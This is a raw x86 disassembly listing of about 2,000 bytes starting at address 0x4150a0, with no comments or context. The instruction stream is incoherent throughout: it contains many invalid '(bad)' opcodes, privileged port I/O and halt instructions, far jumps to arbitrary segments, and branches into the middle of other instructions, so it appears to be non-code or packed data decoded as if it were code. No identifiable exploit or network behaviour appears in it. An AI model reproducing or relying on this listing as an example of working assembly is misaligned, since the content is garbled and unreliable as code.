  4150a0:	inc    ebx
  4150a1:	(bad)  
  4150a3:	cld    
  4150a4:	into   
  4150a5:	jb     0x4150e6
  4150a7:	frstor [ebx]
  4150a9:	mov    al,0x8c
  4150ab:	jmp    0xb56858f7
  4150b0:	out    0x23,al
  4150b2:	mov    ebp,0x4da4c588
  4150b7:	mov    edi,0x5791e614
  4150bc:	lds    esp,FWORD PTR [edi-0x80]
  4150bf:	loopne 0x4150c7
  4150c1:	mov    dh,BYTE PTR [edx]
  4150c3:	hlt    
  4150c4:	daa    
  4150c5:	mov    esi,0x95adb1da
  4150ca:	sbb    al,BYTE PTR [ebp+eax*4-0x3f0dc056]
  4150d1:	jl     0x4150c6
  4150d3:	sbb    eax,0x924eaad6
  4150d8:	pop    ss
  4150d9:	pop    esp
  4150da:	mov    ch,0x79
  4150dc:	pop    ds
  4150dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150de:	js     0x4150af
  4150e0:	sbb    al,0xaa
  4150e2:	cmp    esi,ebp
  4150e4:	mov    ch,0xd6
  4150e6:	xchg   edx,eax
  4150e7:	imul   DWORD PTR [ecx+0x42]
  4150ea:	cmp    BYTE PTR [ecx+ebx*4+0x20],dh
  4150ee:	pop    esp
  4150ef:	inc    edi
  4150f0:	sub    edi,edx
  4150f2:	adc    BYTE PTR [ecx+0x45],0x85
  4150f6:	clc    
  4150f7:	add    BYTE PTR cs:[edi-0xaafb69c],cl
  4150fe:	repz and eax,0xcca822d0
  415104:	sahf   
  415105:	jb     0x415145
  415107:	in     eax,dx
  415108:	add    bl,cl
  41510a:	sub    al,0x41
  41510c:	cs mov dh,0xd9
  41510f:	std    
  415110:	cmp    ch,ah
  415112:	ins    DWORD PTR es:[edi],dx
  415113:	xchg   BYTE PTR [ecx+0x44da0a4a],cl
  415119:	jb     0x41509c
  41511b:	stos   BYTE PTR es:[edi],al
  41511c:	sub    ebx,DWORD PTR [edx]
  41511e:	mov    bh,0xdc
  415120:	das    
  415121:	or     BYTE PTR [eax-0x19e7f443],bl
  415127:	push   esp
  415128:	xor    eax,DWORD PTR [eax+0x67]
  41512b:	sbb    DWORD PTR [eax-0x5f],esp
  41512e:	xor    esp,eax
  415130:	mov    bl,0xb0
  415132:	in     al,0xa5
  415134:	mov    dl,0xd1
  415136:	repz test eax,0x3d53383b
  41513c:	inc    esp
  41513d:	sub    DWORD PTR [ebx],esi
  41513f:	inc    ecx
  415140:	push   edi
  415141:	or     eax,0x113c92dd
  415146:	jp     0x41516e
  415148:	stos   BYTE PTR es:[edi],al
  415149:	or     eax,0x64a1a501
  41514e:	pop    es
  41514f:	je     0x415161
  415151:	mov    dh,0xc5
  415153:	push   ecx
  415154:	ins    BYTE PTR es:[edi],dx
  415155:	mov    ah,0x7
  415157:	cwde   
  415158:	inc    ebp
  415159:	repz pushf 
  41515b:	pop    edx
  41515c:	jo     0x415100
  41515e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41515f:	leave  
  415160:	add    al,0x9e
  415162:	xor    DWORD PTR ds:0x5074df93,eax
  415168:	mov    ecx,0xd72db6a7
  41516d:	mov    esp,DWORD PTR [eax]
  41516f:	push   edi
  415170:	jl     0x4150ff
  415172:	nop
  415173:	aaa    
  415174:	out    0xca,eax
  415176:	dec    edx
  415177:	mov    ecx,0x79a406c4
  41517c:	cmp    al,0x77
  41517e:	loopne 0x4151f3
  415180:	stc    
  415181:	and    al,0xa2
  415183:	out    0x55,al
  415185:	xor    DWORD PTR [eax-0x45],ecx
  415188:	fmulp  st(3),st
  41518a:	in     eax,0xf1
  41518c:	adc    ebp,DWORD PTR [eax-0x70a41b53]
  415192:	jb     0x415188
  415194:	jns    0x4151b8
  415196:	in     eax,0x44
  415198:	mov    ebx,ecx
  41519a:	xchg   DWORD PTR [edi+0x18695f41],eax
  4151a0:	xor    DWORD PTR gs:[eax],edx
  4151a3:	sti    
  4151a4:	inc    esi
  4151a5:	inc    ebx
  4151a6:	add    al,BYTE PTR [eax+0x11]
  4151a9:	sar    DWORD PTR [edi+0x25],0xe7
  4151ad:	dec    ebx
  4151ae:	in     eax,dx
  4151af:	sbb    al,0x10
  4151b1:	mov    dl,0x21
  4151b3:	or     DWORD PTR [ecx],0xffffff91
  4151b6:	or     al,0xf6
  4151b8:	cmp    ecx,esp
  4151ba:	imul   ebx,ecx,0x66437e5a
  4151c0:	jno    0x415232
  4151c2:	jne    0x415157
  4151c4:	scas   eax,DWORD PTR es:[edi]
  4151c5:	and    al,0xde
  4151c7:	div    BYTE PTR [ebp+ebx*4-0x3964ec1a]
  4151ce:	ins    BYTE PTR es:[edi],dx
  4151cf:	xchg   DWORD PTR [edi+0x1f],edi
  4151d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d3:	rcl    BYTE PTR [edi],0xaf
  4151d6:	dec    eax
  4151d7:	rcr    DWORD PTR [ebx-0x72],1
  4151da:	adc    DWORD PTR [ecx-0x67],eax
  4151dd:	mov    bl,0xa9
  4151df:	xor    al,0xf7
  4151e1:	mov    dh,0x98
  4151e3:	leave  
  4151e4:	imul   edi,DWORD PTR [ebp+eax*2+0x42],0x3
  4151e9:	add    BYTE PTR [edi],dl
  4151eb:	adc    edx,DWORD PTR [eax]
  4151ed:	add    cl,BYTE PTR [eax]
  4151ef:	jae    0x415207
  4151f1:	test   eax,0x2d919922
  4151f6:	call   0x310b2abd
  4151fb:	pop    esp
  4151fc:	mov    ebp,0x4ee4c07c
  415201:	jmp    0x415233
  415203:	push   esi
  415204:	push   ss
  415205:	scas   al,BYTE PTR es:[edi]
  415206:	(bad)  
  415207:	and    ch,BYTE PTR [ebp+edx*1+0x731cfe9d]
  41520e:	lods   eax,DWORD PTR ds:[esi]
  41520f:	clc    
  415210:	inc    ebp
  415211:	push   ds
  415212:	enter  0x8b4b,0x1d
  415216:	jbe    0x4151bf
  415218:	js     0x4151a5
  41521a:	ss sbb al,0x10
  41521d:	pop    ebx
  41521e:	ins    DWORD PTR es:[edi],dx
  41521f:	popf   
  415220:	inc    edi
  415221:	cs bnd jp 0x415258
  415225:	and    DWORD PTR [ebp+0x313ef0f5],esi
  41522b:	dec    ecx
  41522c:	sbb    DWORD PTR [ecx+0x59],ebx
  41522f:	mov    DWORD PTR [edi+eax*2-0x47],0x8ff14dcd
  415237:	mov    ebp,0x9e6c29ea
  41523c:	xchg   esp,esi
  41523e:	jb     0x41525c
  415240:	rcr    ch,1
  415242:	xor    BYTE PTR [ecx],dh
  415244:	and    BYTE PTR [edx+0x43a8fe69],0xd5
  41524b:	sub    BYTE PTR [edx],cl
  41524d:	pop    eax
  41524e:	retf   
  41524f:	jmp    0x2dfe04d7
  415254:	mov    bh,0xe5
  415256:	mov    eax,DWORD PTR [ecx]
  415258:	pop    es
  415259:	fwait
  41525a:	jecxz  0x415276
  41525c:	loopne 0x4152ba
  41525e:	xchg   DWORD PTR [eax],ebx
  415260:	sbb    al,0x52
  415262:	adc    DWORD PTR [esi],ecx
  415264:	sub    edi,ecx
  415266:	sub    eax,0xf566e27
  41526b:	mov    ebp,DWORD PTR ds:0xca7d7129
  415271:	into   
  415272:	and    eax,0x5b7e2ee3
  415277:	cwde   
  415278:	adc    ecx,esi
  41527a:	ret    0xfa67
  41527d:	bound  esp,QWORD PTR [ecx-0x4d]
  415280:	pop    ebp
  415281:	inc    eax
  415282:	stos   BYTE PTR es:[edi],al
  415283:	cmp    DWORD PTR [edi+0x4f],ecx
  415286:	dec    esi
  415287:	aaa    
  415288:	fadd   st,st(6)
  41528a:	xor    DWORD PTR [edi-0x29a9d1e7],edi
  415290:	(bad)  
  415291:	xor    DWORD PTR [esi+0x41],ebx
  415294:	jns    0x415228
  415296:	out    dx,eax
  415297:	mov    ebx,0xf7b66ad
  41529c:	or     cl,BYTE PTR [esp+ebp*1-0x2b1f51b7]
  4152a3:	add    eax,0x91d7d64a
  4152a8:	shl    DWORD PTR [esp+ebx*1],1
  4152ab:	ret    
  4152ac:	xchg   esi,eax
  4152ad:	lahf   
  4152ae:	mov    bh,0x12
  4152b0:	lods   eax,DWORD PTR ds:[esi]
  4152b1:	popf   
  4152b2:	dec    eax
  4152b3:	xor    BYTE PTR [edx],0xf8
  4152b6:	dec    edi
  4152b7:	iret   
  4152b8:	cld    
  4152b9:	mov    ebp,DWORD PTR [ebp+0x586add9b]
  4152bf:	out    0x7a,eax
  4152c1:	sub    dh,BYTE PTR [edi+0x6f]
  4152c4:	push   0xffffffe3
  4152c6:	jbe    0x41530f
  4152c8:	mov    bh,bh
  4152ca:	and    dl,BYTE PTR [edx-0x4fc1ebab]
  4152d0:	inc    esi
  4152d1:	or     DWORD PTR [edx+esi*4],ebp
  4152d4:	jge    0x415339
  4152d6:	xchg   ebx,eax
  4152d7:	(bad)  
  4152d8:	adc    edx,ebx
  4152da:	inc    esi
  4152db:	jmp    0xe9e9:0xe0420765
  4152e2:	pushf  
  4152e3:	xlat   BYTE PTR ds:[ebx]
  4152e4:	and    eax,0x7c11e9f8
  4152e9:	or     esp,ecx
  4152eb:	xor    esp,DWORD PTR [ebp+0x5a492c92]
  4152f1:	jne    0x41532d
  4152f3:	pop    eax
  4152f4:	push   ebx
  4152f5:	faddp  st(7),st
  4152f7:	call   0x66ab:0xe58e3327
  4152fe:	call   0x8c96:0xa3066510
  415305:	rol    BYTE PTR [edi+0x6df106bb],0xc4
  41530c:	shr    BYTE PTR [ebp-0x1a],1
  41530f:	pop    ds
  415310:	push   edi
  415311:	idiv   DWORD PTR [edi-0x34]
  415314:	and    al,0x8d
  415316:	dec    edi
  415317:	sbb    bh,bh
  415319:	xchg   ebp,eax
  41531a:	cmp    eax,0xf89ac4e1
  41531f:	ss or  al,0xcf
  415322:	popf   
  415323:	and    bl,BYTE PTR ds:0x28c346c9
  415329:	ja     0x4152d7
  41532b:	cmp    dh,BYTE PTR [ebx+0x7cfb52fd]
  415331:	or     dl,dh
  415333:	outs   dx,BYTE PTR ds:[esi]
  415334:	sub    eax,0xabe0dd8d
  415339:	retf   
  41533a:	mov    ds:0x2381f6e1,eax
  41533f:	in     eax,dx
  415340:	cmp    BYTE PTR [edx-0x12],0x9a
  415344:	or     DWORD PTR [ebp+0x40c57bfa],0x27d96487
  41534e:	push   cs
  41534f:	mov    al,0x15
  415351:	adc    DWORD PTR [esi],edi
  415353:	clc    
  415354:	xchg   ecx,eax
  415355:	xchg   ebx,eax
  415356:	pop    ds
  415357:	aaa    
  415358:	pop    ebp
  415359:	sbb    al,0x3b
  41535b:	sbb    dh,BYTE PTR [edx]
  41535d:	call   0xd47b:0x41ea4f3f
  415364:	push   es
  415365:	shl    DWORD PTR [ebp-0x4e336792],cl
  41536b:	fild   QWORD PTR [esi]
  41536d:	push   edx
  41536e:	jmp    0x4f479277
  415373:	shr    BYTE PTR [esi],0x5f
  415376:	cmp    eax,0x57f417c0
  41537b:	dec    ebx
  41537c:	add    eax,0xbe7881ba
  415381:	xor    al,0x41
  415383:	imul   ebx,DWORD PTR [eax+ebx*1+0x75],0xffffffc7
  415388:	mov    dl,0xe3
  41538a:	xchg   ecx,ebp
  41538c:	das    
  41538d:	(bad)  
  41538e:	add    DWORD PTR [ecx+0x26],esi
  415391:	sbb    DWORD PTR [ebx+0x8792b2d],edx
  415397:	pop    ebx
  415398:	push   ds
  415399:	sahf   
  41539a:	ins    BYTE PTR es:[edi],dx
  41539b:	pop    esp
  41539c:	xor    DWORD PTR [eax+edi*8],eax
  41539f:	mov    dh,0x9
  4153a1:	fld    TBYTE PTR [ebp*1-0x3edc4984]
  4153a8:	js     0x4153aa
  4153aa:	sub    esi,ebp
  4153ac:	test   ecx,edi
  4153ae:	arpl   WORD PTR [edx+0x57],bx
  4153b1:	mov    ah,0x9f
  4153b3:	cmp    al,0x11
  4153b5:	ss mov eax,0x395151a4
  4153bb:	aas    
  4153bc:	mov    esi,0xcf3194a6
  4153c1:	loop   0x4153a5
  4153c3:	inc    esi
  4153c4:	mov    ds:0xd512397e,al
  4153c9:	out    0xbb,al
  4153cb:	sub    eax,0x7600a76f
  4153d0:	mov    ?,WORD PTR [edx]
  4153d2:	mov    ebp,0xfb063fc8
  4153d7:	mov    eax,0x928a143b
  4153dc:	scas   al,BYTE PTR es:[edi]
  4153dd:	xchg   ecx,ebp
  4153df:	data16 jbe 0x415457
  4153e2:	mov    cl,0x9a
  4153e4:	push   ebp
  4153e5:	sbb    eax,0xb3008798
  4153ea:	stos   BYTE PTR es:[edi],al
  4153eb:	pop    ebp
  4153ec:	cdq    
  4153ed:	(bad)  
  4153ee:	pushf  
  4153ef:	jp     0x4153cb
  4153f1:	imul   edx,ebp,0x7b1b2410
  4153f7:	sbb    eax,0xbc745686
  4153fc:	cld    
  4153fd:	inc    edi
  4153fe:	lods   eax,DWORD PTR ds:[esi]
  4153ff:	push   eax
  415400:	repz add DWORD PTR [ecx+0x10],edx
  415404:	inc    ebp
  415405:	arpl   WORD PTR [edx+eax*1-0x694ab6ad],bp
  41540c:	sbb    DWORD PTR [eax+0x1],edi
  41540f:	pushf  
  415410:	add    DWORD PTR [esi+0x7d5d9556],ebp
  415416:	cmc    
  415417:	sbb    al,0x2f
  415419:	std    
  41541a:	mov    esp,DWORD PTR [edx]
  41541c:	test   eax,0x7da06759
  415421:	loopne 0x4153b4
  415423:	enter  0xc899,0xfa
  415427:	inc    eax
  415428:	or     BYTE PTR ds:0xe4442996,0x27
  41542f:	cdq    
  415430:	sbb    ch,BYTE PTR [esi-0x37]
  415433:	inc    eax
  415434:	inc    edi
  415435:	jg     0x41542f
  415437:	into   
  415438:	(bad)  
  415439:	jle    0x415410
  41543b:	inc    edx
  41543c:	or     al,0xb2
  41543e:	shl    DWORD PTR [ecx+eax*8+0x50956dd0],0xf7
  415446:	outs   dx,DWORD PTR ds:[esi]
  415447:	and    BYTE PTR [ecx+ebx*8],0x7f
  41544b:	adc    bh,BYTE PTR [esi]
  41544d:	mov    ah,BYTE PTR [esi+0x5518e0db]
  415453:	hlt    
  415454:	call   0x16ee:0xab2d9b16
  41545b:	sbb    BYTE PTR [ebx-0x59],bl
  41545e:	rcr    BYTE PTR [esi],cl
  415460:	pop    es
  415461:	or     dh,BYTE PTR [eax+ebp*2-0x79]
  415465:	cdq    
  415466:	xor    al,BYTE PTR [esi+0x41]
  415469:	call   0x82df:0x78f60063
  415470:	jns    0x4154c5
  415472:	in     al,0x62
  415474:	push   ebp
  415475:	in     al,0xdb
  415477:	ins    DWORD PTR es:[edi],dx
  415478:	jl     0x4154f6
  41547a:	mov    al,ds:0x7f0a35bf
  41547f:	fsub   QWORD PTR [esi-0x47db9679]
  415486:	and    ecx,DWORD PTR [eax]
  415488:	jmp    0xe069:0xeb37a844
  41548f:	std    
  415490:	ins    BYTE PTR es:[edi],dx
  415491:	inc    esi
  415492:	cmp    ebp,DWORD PTR [edx+0x205dcafd]
  415498:	pop    esp
  415499:	ror    ch,0xda
  41549c:	imul   esi,DWORD PTR [ecx-0x45],0x6e
  4154a0:	hlt    
  4154a1:	dec    ebx
  4154a2:	inc    edx
  4154a3:	in     al,dx
  4154a4:	imul   edi,ebx,0xffffffee
  4154a7:	push   ebx
  4154a8:	pusha  
  4154a9:	je     0x415490
  4154ab:	cmp    dl,BYTE PTR [ecx-0x65608b7b]
  4154b1:	push   esp
  4154b2:	push   es
  4154b3:	mov    ?,WORD PTR [esi]
  4154b5:	test   DWORD PTR [ebx+0x7f],eax
  4154b8:	mov    eax,0xa13850e1
  4154bd:	dec    esi
  4154be:	popa   
  4154bf:	xchg   ebp,eax
  4154c0:	aaa    
  4154c1:	aas    
  4154c2:	imul   ecx,DWORD PTR fs:[ecx+ebx*2-0x1ebfc4d1],0xb6313794
  4154ce:	add    ecx,esi
  4154d0:	imul   ebx,DWORD PTR [esi-0x149706a9],0x3e
  4154d7:	lods   al,BYTE PTR ds:[esi]
  4154d8:	cmc    
  4154d9:	stos   BYTE PTR es:[edi],al
  4154da:	ret    
  4154db:	popa   
  4154dc:	jb     0x41547d
  4154de:	mov    bl,0xce
  4154e0:	and    dl,BYTE PTR [edi]
  4154e2:	aam    0x89
  4154e4:	sub    DWORD PTR [edx],esi
  4154e6:	push   ebp
  4154e7:	std    
  4154e8:	xor    al,0xa4
  4154ea:	mov    ecx,0xcef076ea
  4154ef:	mov    DWORD PTR [esi+ecx*2-0x6ebd9091],ecx
  4154f6:	sbb    eax,0x1264f7a1
  4154fb:	mov    dh,0xd6
  4154fd:	lods   eax,DWORD PTR ds:[esi]
  4154fe:	sbb    eax,0x9558d38f
  415503:	push   ss
  415504:	(bad)
  415508:	mov    ecx,0xb3c4291c
  41550d:	sar    cl,1
  41550f:	cmp    ebx,DWORD PTR cs:[ebx+0x4b6cc364]
  415516:	push   es
  415517:	retf   
  415518:	jp     0x4154a8
  41551a:	fwait
  41551b:	add    eax,0x6bf951f1
  415520:	imul   eax,DWORD PTR ds:0xce554e74,0xffffff9f
  415527:	add    esp,DWORD PTR [eax]
  415529:	pop    ebp
  41552a:	push   ecx
  41552b:	retf   
  41552c:	push   ebx
  41552d:	aam    0x1b
  41552f:	stos   BYTE PTR es:[edi],al
  415530:	mov    dh,0x16
  415532:	push   ebx
  415533:	mov    esi,0x7185129e
  415538:	loopne 0x41554f
  41553a:	outs   dx,BYTE PTR ds:[esi]
  41553b:	inc    eax
  41553c:	adc    eax,0xc99472fa
  415541:	je     0x4154dd
  415543:	pop    DWORD PTR [eax+0x6d03c0de]
  415549:	lods   al,BYTE PTR ds:[esi]
  41554a:	and    bh,dl
  41554c:	xor    dl,0xd9
  41554f:	sbb    al,0x6f
  415551:	popf   
  415552:	loop   0x415526
  415554:	jae    0x4342fb7
  41555a:	jecxz  0x4154f4
  41555c:	les    edi,FWORD PTR [edi+eax*2-0x211dabd9]
  415563:	mov    WORD PTR [edi],fs
  415565:	or     edi,DWORD PTR es:[ebp+0xabb8671]
  41556c:	shl    DWORD PTR [ebp+edx*1+0x60b491ce],0x43
  415574:	inc    ecx
  415575:	and    edi,DWORD PTR [ebx]
  415577:	int3   
  415578:	xchg   ebx,eax
  415579:	add    ebp,eax
  41557b:	mov    edi,0x8da1717f
  415580:	xchg   esp,eax
  415581:	and    dh,dh
  415583:	cmp    al,0x72
  415585:	imul   edi,DWORD PTR [esi],0x1a
  415588:	xchg   BYTE PTR [edi+0x65621e11],cl
  41558e:	int3   
  41558f:	cmp    eax,0x71fe48e2
  415594:	and    al,BYTE PTR [eax+0x1e]
  415597:	or     eax,0xa3a2ed21
  41559c:	(bad)  
  41559d:	xor    DWORD PTR [esi+0x3e5a01e5],ebx
  4155a3:	xchg   esp,eax
  4155a4:	adc    ebx,DWORD PTR [eax+eiz*1+0x55481b89]
  4155ab:	cmp    al,0x9
  4155ad:	xchg   edi,eax
  4155ae:	fcom   DWORD PTR [edi+0x57189af6]
  4155b4:	sbb    al,0xfe
  4155b6:	jno    0x4155cb
  4155b8:	aas    
  4155b9:	mov    dh,0xf2
  4155bb:	mov    ds:0x1bd9bcaa,al
  4155c0:	push   ecx
  4155c1:	pop    esp
  4155c2:	add    eax,DWORD PTR [eax+0x5e]
  4155c5:	inc    eax
  4155c6:	(bad)  
  4155c7:	xor    esi,edx
  4155c9:	(bad)  
  4155ca:	dec    esp
  4155cb:	sub    dh,dh
  4155cd:	pusha  
  4155ce:	mov    esp,0x96bd9c18
  4155d3:	in     al,dx
  4155d4:	sbb    al,BYTE PTR [edi]
  4155d6:	and    dh,dl
  4155d8:	and    cl,ah
  4155da:	add    ebp,DWORD PTR [esi-0x5f4bc4a0]
  4155e0:	or     dh,BYTE PTR [ebx]
  4155e2:	inc    edi
  4155e3:	mov    ecx,0x37bc6b4
  4155e8:	or     edx,DWORD PTR [ebx+0x12]
  4155eb:	pop    edi
  4155ec:	aas    
  4155ed:	arpl   WORD PTR [ebp+0x1d],dx
  4155f0:	xchg   ebx,eax
  4155f1:	cdq    
  4155f2:	and    al,0x94
  4155f4:	and    edi,DWORD PTR [ebx-0x13]
  4155f7:	jno    0x41566b
  4155f9:	sbb    eax,DWORD PTR [ebp-0x43c69e0e]
  4155ff:	icebp  
  415600:	pop    esp
  415601:	loop   0x415671
  415603:	mov    cs,WORD PTR ds:0x528adfc3
  415609:	fld    DWORD PTR [ecx]
  41560b:	fadd   DWORD PTR [ebp-0x57]
  41560e:	arpl   WORD PTR [esi+0x2edc71e2],di
  415614:	sbb    dl,bl
  415616:	loop   0x415634
  415618:	push   esp
  415619:	pop    DWORD PTR [edx]
  41561b:	sbb    BYTE PTR [esi-0x15],bh
  41561e:	mov    eax,0x86a48ca0
  415623:	mov    eax,ds:0x52a5e08c
  415628:	adc    DWORD PTR [eax-0x73],0x17
  41562c:	stos   DWORD PTR es:[edi],eax
  41562d:	adc    eax,0xa33f0c64
  415632:	push   edi
  415633:	jge    0x4156ad
  415635:	mov    ds:0x4d77c443,eax
  41563a:	(bad)  
  41563c:	pop    esi
  41563d:	ja     0x41563a
  41563f:	xor    eax,0x2a1502ef
  415644:	stc    
  415645:	clc    
  415646:	sub    DWORD PTR [esi],0xa6f3b238
  41564c:	arpl   bx,bp
  41564e:	sub    DWORD PTR [esi+eax*1+0x47acf320],ebp
  415655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415656:	sbb    ebx,ebx
  415658:	(bad)  
  415659:	push   ebx
  41565a:	jmp    0xfa1a:0xb517b999
  415661:	retf   
  415662:	cmp    DWORD PTR [ebx+0x6c],edx
  415665:	sti    
  415666:	retf   
  415667:	cmc    
  415668:	(bad)  
  415669:	enter  0x1f6,0x66
  41566d:	pop    esp
  41566e:	mov    eax,0xf96f0065
  415673:	cmp    al,0x20
  415675:	lods   eax,DWORD PTR ds:[esi]
  415676:	clc    
  415677:	outs   dx,BYTE PTR gs:[esi]
  415679:	iret   
  41567a:	pop    ss
  41567b:	fistp  WORD PTR [ecx+0x5f6fdca5]
  415681:	jge    0x4156f0
  415683:	fimul  WORD PTR [esi-0x77]
  415686:	xor    eax,0xb6a24054
  41568b:	mov    ecx,0xb4312f72
  415690:	scas   al,BYTE PTR es:[edi]
  415691:	mov    BYTE PTR [edx-0x6cb876ba],ah
  415697:	lea    ecx,[eax+0x1f]
  41569a:	xchg   ebp,eax
  41569b:	dec    ebx
  41569c:	mov    ch,0xc8
  41569e:	loope  0x4156fd
  4156a0:	sbb    bl,al
  4156a2:	in     al,dx
  4156a3:	jb     0x415671
  4156a5:	mov    dl,0xb9
  4156a7:	pop    esp
  4156a8:	loop   0x4156df
  4156aa:	mov    al,ds:0x5dba5b11
  4156af:	addr16 xor eax,edi
  4156b2:	jmp    0x20f0176c
  4156b7:	cmp    edi,eax
  4156b9:	mov    ebp,DWORD PTR [ebx]
  4156bb:	or     bl,BYTE PTR [eax+0x69]
  4156be:	in     al,0xba
  4156c0:	jb     0x4156f6
  4156c2:	adc    BYTE PTR [esi],dh
  4156c4:	js     0x41568c
  4156c6:	cmp    eax,0xfeb10082
  4156cb:	xchg   edi,eax
  4156cc:	in     eax,dx
  4156cd:	outs   dx,DWORD PTR ds:[esi]
  4156ce:	fwait
  4156cf:	lods   eax,DWORD PTR ds:[esi]
  4156d0:	push   ebp
  4156d1:	and    al,0x5a
  4156d3:	sbb    ch,bl
  4156d5:	or     eax,0xd5184556
  4156da:	or     edi,DWORD PTR [ebx-0x3]
  4156dd:	xor    dl,bh
  4156df:	ficomp WORD PTR [esi-0x5e]
  4156e2:	sti    
  4156e3:	dec    ebp
  4156e4:	inc    esp
  4156e5:	mov    ecx,ecx
  4156e7:	inc    ebx
  4156e8:	xchg   esp,eax
  4156e9:	inc    esp
  4156ea:	xor    al,0xdc
  4156ec:	xor    dl,BYTE PTR [ebx+eax*8-0x38b14fb1]
  4156f3:	mov    edx,0x4a5998ec
  4156f8:	loope  0x4156f6
  4156fa:	pop    ss
  4156fb:	jnp    0x415778
  4156fd:	add    cl,ch
  4156ff:	mov    esp,0xb4da44fe
  415704:	lea    edi,[ebx]
  415706:	inc    esi
  415707:	xor    eax,0x3cdad956
  41570c:	pop    edi
  41570d:	adc    DWORD PTR gs:0x6d64114f,0xec67ba1e
  415718:	sbb    DWORD PTR [ecx],ecx
  41571a:	and    ebp,DWORD PTR [ecx+ebx*8]
  41571d:	retf   
  41571e:	jmp    0x9756:0xf92da55a
  415725:	stc    
  415726:	mov    eax,0x21f7815a
  41572b:	pop    esp
  41572c:	jno    0x4156b5
  41572e:	xor    cl,BYTE PTR [ecx]
  415730:	mov    ecx,0xdf13c3b2
  415735:	jge    0x41572c
  415737:	xor    eax,0x1fd99e19
  41573c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41573d:	mov    ah,0xe9
  41573f:	push   ecx
  415740:	fisubr WORD PTR [ebx]
  415742:	dec    eax
  415743:	sbb    esp,esp
  415745:	jno    0x415755
  415747:	and    edx,eax
  415749:	(bad)  
  41574a:	cmc    
  41574b:	test   BYTE PTR gs:[eax-0x45],dl
  41574f:	mov    es,ecx
  415751:	mov    BYTE PTR [edi+0x70],ch
  415754:	les    esp,FWORD PTR [ebx+0x61]
  415757:	push   ebx
  415758:	stc    
  415759:	xor    al,0x26
  41575b:	xor    eax,0x9bdb4811
  415760:	xor    al,0xf7
  415762:	out    dx,al
  415763:	stc    
  415764:	call   0xaa8e28ba
  415769:	jmp    0x415748
  41576b:	inc    ecx
  41576c:	sahf   
  41576d:	pop    edx
  41576e:	loopne 0x4157d8
  415770:	scas   al,BYTE PTR es:[edi]
  415771:	fldenv [edi]
  415773:	icebp  
  415774:	mov    edx,0x16bcb064
  415779:	mov    esp,ecx
  41577b:	retf   0x737c
  41577e:	inc    edi
  41577f:	sub    eax,0x406c8850
  415784:	push   0xffffffe6
  415786:	mov    ah,0x19
  415788:	sbb    ecx,ebx
  41578a:	(bad)  
  41578b:	out    0xc2,al
  41578d:	dec    ebp
  41578e:	inc    ecx
  41578f:	fdiv   DWORD PTR [ebx]
  415791:	mov    ds:0x7c00d6ba,eax
  415796:	std    
  415797:	ret    0xf852
  41579a:	lods   eax,DWORD PTR ds:[esi]
  41579b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579c:	mov    ecx,0xc63d12cb
  4157a1:	add    cl,al
  4157a3:	ins    DWORD PTR es:[edi],dx
  4157a4:	bound  esp,QWORD PTR [ebx+0x1b]
  4157a7:	scas   al,BYTE PTR es:[edi]
  4157a8:	mov    ah,0x95
  4157aa:	lea    ebp,[edi+0x590c0727]
  4157b0:	pop    ds
  4157b1:	sbb    BYTE PTR [edx],dl
  4157b3:	gs push eax
  4157b5:	jno    0x4157ac
  4157b7:	popa   
  4157b8:	cmp    dl,al
  4157ba:	pop    ecx
  4157bb:	fwait
  4157bc:	sbb    DWORD PTR [edx],0xffffffa3
  4157bf:	into   
  4157c0:	fstp   st(7)
  4157c3:	mov    ah,0xb6
  4157c5:	xor    DWORD PTR [ebp+0x711a7a2],0xffffffe0
  4157cc:	(bad)  
  4157cd:	sti    
  4157ce:	mov    ds:0x7c8ff352,eax
  4157d3:	je     0x415774
  4157d5:	push   eax
  4157d6:	push   0xfffffff1
  4157d8:	dec    eax
  4157d9:	mov    ecx,0x741cd4a3
  4157de:	adc    BYTE PTR [eax],ah
  4157e0:	popa   
  4157e1:	ss pop edx
  4157e3:	push   esp
  4157e4:	inc    eax
  4157e5:	mov    edx,0xcaaeb53
  4157ea:	or     ch,BYTE PTR [ebx+0x12f4283e]
  4157f0:	popf   
  4157f1:	push   cs
  4157f2:	std    
  4157f3:	or     al,0x74
  4157f5:	fwait
  4157f6:	popa   
  4157f7:	(bad)  
  4157f8:	arpl   WORD PTR [edx+0x271a283c],bp
  4157fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ff:	cmp    al,0xa1
  415801:	inc    eax
  415802:	clc    
  415803:	sub    DWORD PTR [esi],esp
  415805:	ret    0xb1f2
  415808:	ret    0x8713
  41580b:	jle    0x4157c8
  41580d:	cwde   
  41580e:	lds    esi,FWORD PTR [ecx+0x5c]
  415811:	pop    edi
  415812:	sbb    BYTE PTR [ebx+0x5f],dh
  415815:	pop    ss
  415816:	adc    BYTE PTR [edi-0x69af8716],al
  41581c:	scas   eax,DWORD PTR es:[edi]
  41581d:	bound  edi,QWORD PTR [ebx+0xb]
  415820:	ret    
  415821:	sti    
  415822:	mov    edi,0x52f2355
  415827:	icebp  
  415828:	dec    eax
  415829:	mov    al,ds:0x86c342a5
  41582e:	fcomip st,st(6)
  415830:	inc    edx
  415831:	shl    DWORD PTR [edi-0x3070a47a],0x5b
  415838:	inc    esi
  415839:	jo     0x41585d
  41583b:	in     al,0x51
  41583d:	stos   DWORD PTR es:[edi],eax
  41583e:	je     0x4157cd
  415840:	sub    bl,BYTE PTR [ebx-0x2ef78e17]
  415846:	jl     0x415875
  415848:	test   eax,0x93257ba3
  41584d:	or     ah,dl
  41584f:	in     al,dx
  415850:	pop    ds
  415851:	cwde   
  415852:	push   es
  415853:	jo     0x4157fc
  415855:	add    eax,0x552455bf
  41585a:	das    
  41585b:	sbb    ch,ch
  41585d:	jl     0x415873
  41585f:	mov    ch,0x9b
  415861:	sahf   
  415862:	int3   
  415863:	pop    ds
  415864:	inc    eax
  415865:	push   cs
  415866:	in     al,dx
  415867:	scas   al,BYTE PTR es:[edi]
  415868:	mov    ecx,0x555c9769
  41586d:	(bad)  
  41586e:	push   ebp
  41586f:	cwde   
  415870:	dec    ebp
  415871:	dec    ecx
  415872:	mov    ebx,DWORD PTR ds:[eax]
  415875:	or     dl,BYTE PTR [edx+0x2f]
  415878:	mov    ds:0x623863a4,al
  41587d:	fmul   QWORD PTR [edi-0x1beb6b0]
  415883:	sbb    eax,0xae1411e
  415888:	je     0x41585d
